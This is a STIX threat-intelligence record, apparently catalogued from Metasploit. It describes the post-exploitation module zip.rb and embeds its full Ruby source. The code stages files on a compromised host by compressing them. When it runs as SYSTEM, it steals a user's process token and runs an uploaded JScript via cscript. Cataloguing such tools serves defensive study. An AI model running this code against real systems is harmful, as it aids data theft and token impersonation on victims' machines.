{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70f937b3-11cf-4f20-8d55-8eb47602f43a",
    "created": "2024-08-14T16:33:17.99718Z",
    "modified": "2024-08-14T16:33:17.997184Z",
    "name": "Multi Manage File Compressor",
    "description": " This module zips a file or a directory. On Linux, it uses the zip command. On Windows, it will try to use remote target's 7Zip if found. If not, it falls back to its Windows Scripting Host.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/zip.rb",
            "external_id": "zip.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage File Compressor',\n        'Description' => %q{\n          This module zips a file or a directory. On Linux, it uses the zip command.\n          On Windows, it will try to use remote target's 7Zip if found. If not, it falls\n          back to its Windows Scripting Host.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r' ],\n        'Platform' => [ 'win', 'linux' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_rev2self\n              stdapi_sys_config_steal_token\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DESTINATION', [true, 'The destination path']),\n        OptString.new('SOURCE', [true, 'The directory or file to compress'])\n      ]\n    )\n  end\n\n  def get_program_file_path\n    get_env('ProgramFiles')\n  end\n\n  def has_7zip?\n    file?(\"#{get_program_file_path}\\\\7-Zip\\\\7z.exe\")\n  end\n\n  def wsh_script(dst, src)\n    script_file = File.read(File.join(Msf::Config.data_directory, 'post', 'zip', 'zip.js'))\n    src.gsub!('\\\\', '\\\\\\\\\\\\')\n    dst.gsub!('\\\\', '\\\\\\\\\\\\')\n    script_file << \"zip(\\\"#{src}\\\",\\\"#{dst}\\\");\".force_encoding('UTF-8')\n    script_file\n  end\n\n  def find_pid_by_user(username)\n    computer_name = get_env('COMPUTERNAME')\n    print_status(\"Searching for PID for #{computer_name}\\\\\\\\#{username}\")\n    session.sys.process.processes.each do |p|\n      if p['user'] == \"#{computer_name}\\\\#{username}\"\n        return p['pid']\n      end\n    end\n\n    nil\n  end\n\n  def steal_token\n    current_user = get_env('USERNAME')\n    pid = find_pid_by_user(current_user)\n\n    unless pid\n      fail_with(Failure::Unknown, \"Unable to find a PID for #{current_user} to execute WSH\")\n    end\n\n    print_status(\"Stealing token from PID #{pid} for #{current_user}\")\n    begin\n      session.sys.config.steal_token(pid)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      # It could raise an exception even when the token is successfully stolen,\n      # so we will just log the exception and move on.\n      elog(e)\n    end\n\n    @token_stolen = true\n  end\n\n  def upload_exec_wsh_script_zip\n    if is_system?\n      unless session\n        print_error('Unable to compress with WSH technique without Meterpreter')\n        return\n      end\n\n      steal_token\n    end\n\n    script = wsh_script(datastore['DESTINATION'], datastore['SOURCE'])\n    tmp_path = \"#{get_env('TEMP')}\\\\zip.js\"\n    print_status(\"script file uploaded to #{tmp_path}\")\n    write_file(tmp_path, script.encode('UTF-16LE'))\n    cmd_exec(\"cscript.exe #{tmp_path}\")\n  end\n\n  def do_7zip\n    program_file_path = get_program_file_path\n    output = cmd_exec(\"#{program_file_path}\\\\7-Zip\\\\7z.exe a -tzip \\\"#{datastore['DESTINATION']}\\\" \\\"#{datastore['SOURCE']}\\\"\")\n    vprint_line(output)\n  end\n\n  def do_zip\n    output = cmd_exec(\"zip -D -q -r #{datastore['DESTINATION']} #{datastore['SOURCE']}\")\n    vprint_line(output)\n  end\n\n  def windows_zip\n    if has_7zip?\n      print_status(\"Compressing #{datastore['DESTINATION']} via 7zip\")\n      do_7zip\n    else\n      print_status(\"Compressing #{datastore['DESTINATION']} via WSH\")\n      upload_exec_wsh_script_zip\n    end\n  end\n\n  def linux_zip\n    print_status(\"Compressing #{datastore['DESTINATION']} via zip\")\n    do_zip\n  end\n\n  def cleanup\n    if @token_stolen && session\n      session.sys.config.revert_to_self\n      print_status('Token restored.')\n    end\n\n    super\n  end\n\n  def run\n    @token_stolen = false\n\n    if session.platform == 'windows'\n      windows_zip\n    else\n      linux_zip\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win', 'linux' ]"
    ]
}